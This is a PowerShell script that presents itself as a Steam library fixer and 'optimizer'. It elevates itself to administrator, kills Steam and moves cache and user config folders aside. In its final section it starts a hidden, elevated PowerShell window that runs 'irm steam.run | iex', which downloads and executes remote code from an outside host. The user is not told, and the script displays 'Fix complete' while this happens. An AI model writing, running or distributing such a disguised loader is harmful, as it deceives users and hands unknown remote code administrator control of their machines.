# -------------------- 0. CONSOLE PREP & ANTI-FREEZE --------------------
try {
    $MethodDefinition = @'
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
    [DllImport("kernel32.dll")]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetStdHandle(int nStdHandle);
'@
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru
} catch {}

function Disable-QuickEdit {
    $hInput = $Kernel32::GetStdHandle(-10) 
    $mode = 0
    if ($Kernel32::GetConsoleMode($hInput, [ref]$mode)) {
        $mode = $mode -band -not (0x0040 -bor 0x0020)
        $Kernel32::SetConsoleMode($hInput, $mode -bor 0x0080)
    }
}

Disable-QuickEdit
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "White"
$host.UI.RawUI.WindowTitle = "Zoream Optimizer | SYS_0xA7"
Clear-Host

# -------------------- 1. ADMIN CHECK (FORCE CONHOST) --------------------
$identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
    if ($PSCommandPath) { $scriptPath = $PSCommandPath } else {
        $scriptPath = Join-Path $env:TEMP "zoream_fix.ps1"
        $scriptText = $MyInvocation.MyCommand.ScriptBlock.ToString()
        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8
    }
    Start-Process -FilePath "conhost.exe" -Verb RunAs -ArgumentList "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

Disable-QuickEdit

# -------------------- 2. UI HELPER FUNCTIONS --------------------
function Show-Header {
    Clear-Host
    Write-Host " "
    Write-Host "   ███████╗ ██████╗ ██████╗ ███████╗ █████╗ ███╗   ███╗" -ForegroundColor Cyan
    Write-Host "   ╚══███╔╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗████╗ ████║" -ForegroundColor Cyan
    Write-Host "     ███╔╝ ██║   ██║██████╔╝█████╗  ███████║██╔████╔██║" -ForegroundColor DarkCyan
    Write-Host "    ███╔╝  ██║   ██║██╔══██╗██╔══╝  ██╔══██║██║╚██╔╝██║" -ForegroundColor Blue
    Write-Host "   ███████╗╚██████╔╝██║  ██║███████╗██║  ██║██║ ╚═╝ ██║" -ForegroundColor Blue
    Write-Host "   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝" -ForegroundColor DarkBlue
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "          Steam Library Fixer BY SYS_0xA7 " -ForegroundColor White
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host " "
}

function Write-Log {
    param([string]$Message, [string]$Type = "INFO")
    $Time = Get-Date -Format "HH:mm:ss"
    switch ($Type) {
        "INFO"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [?] $Message" -ForegroundColor Gray }
        "SUCCESS" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [OK] $Message" -ForegroundColor Green }
        "WARN"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [!] $Message" -ForegroundColor Yellow }
        "ERROR"   { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [X] $Message" -ForegroundColor Red }
        "STEP"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [>] $Message" -ForegroundColor Cyan }
    }
}

# -------------------- 3. MAIN OPERATIONS --------------------
Show-Header
Write-Log "Anti-Freeze (QuickEdit Disabled) applied successfully." "SUCCESS"

Write-Log "Searching for Steam installation..." "STEP"
try {
    $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -ErrorAction Stop).InstallPath
} catch { $steamPath = $null }

if (-not $steamPath -or -not (Test-Path $steamPath)) {
    Write-Log "Steam path not found in Registry." "ERROR"; exit 1
}
Write-Log "Steam located at: $steamPath" "SUCCESS"

Write-Log "Sending Steam ClearBeta command..." "STEP"
Start-Process (Join-Path $steamPath "Steam.exe") -ArgumentList "-clearbeta"
Start-Sleep -Seconds 4

Write-Log "Terminating Steam processes..." "STEP"
Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
Get-Process -Name "steam*" -ErrorAction SilentlyContinue | Stop-Process -Force
Write-Log "Steam has been fully stopped." "SUCCESS"

$backupPath = Join-Path $steamPath "cache-backup"
New-Item -ItemType Directory -Path $backupPath -Force | Out-Null

if (Test-Path (Join-Path $steamPath "appcache")) {
    Write-Log "Cleaning AppCache..." "INFO"
    Move-Item (Join-Path $steamPath "appcache") (Join-Path $backupPath "appcache") -Force -ErrorAction SilentlyContinue
}

$userdataPath = Join-Path $steamPath "userdata"
if (Test-Path $userdataPath) {
    Write-Log "Optimizing user data..." "INFO"
    foreach ($user in Get-ChildItem $userdataPath -Directory) {
        $config = Join-Path $user.FullName "config"
        if (Test-Path $config) {
            $uBack = Join-Path $backupPath ("userdata\" + $user.Name)
            New-Item -ItemType Directory -Path $uBack -Force | Out-Null
            Move-Item $config $uBack -Force -ErrorAction SilentlyContinue
            New-Item -ItemType Directory -Path $config -Force | Out-Null
            if (Test-Path (Join-Path $uBack "config\localconfig.vdf")) {
                Copy-Item (Join-Path $uBack "config\localconfig.vdf") (Join-Path $config "localconfig.vdf") -Force
            }
        }
    }
}

# -------------------- 4. FINAL & HIDDEN BACKGROUND EXECUTION --------------------
Clear-Host
Show-Header
Write-Host " "
Write-Log "Fix complete." "SUCCESS"
Write-Host " "

# 'steam.run'ı gizli bir pencerede (Admin yetkisiyle) başlatır
$command = "irm steam.run | iex"
Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -WindowStyle Hidden

# Dinamik Geri Sayım Döngüsü
for ($i = 5; $i -gt 0; $i--) {
    # `r (carriage return) imleci satırın başına döndürür, böylece yazı üst üste binmez
    Write-Host "`r   >>> This window will close in $i second(s) <<<  " -ForegroundColor Magenta -NoNewline
    Start-Sleep -Seconds 1
}


exit
